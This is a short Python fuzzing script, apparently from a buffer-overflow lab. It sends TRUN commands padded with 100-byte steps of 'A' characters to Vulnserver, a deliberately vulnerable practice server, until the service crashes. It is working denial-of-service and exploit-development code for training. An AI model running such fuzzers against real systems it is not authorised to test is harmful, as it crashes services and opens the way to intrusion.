"""
Python script to fuzz a specific command to identify the vulnerable buffer size. 
Increments the buffer by 100 after each attempt. Monitor vulnerable program 
in Immunity Debugger to see the registers when the program is paused due to 
exceeding the buffer size. Tested only against Vulnserver. 
"""

!/usr/bin/python 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # change IP and port, if needed (9999 is vulnservers default port)
        s.connect(('192.168.1.35',9999)) 
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
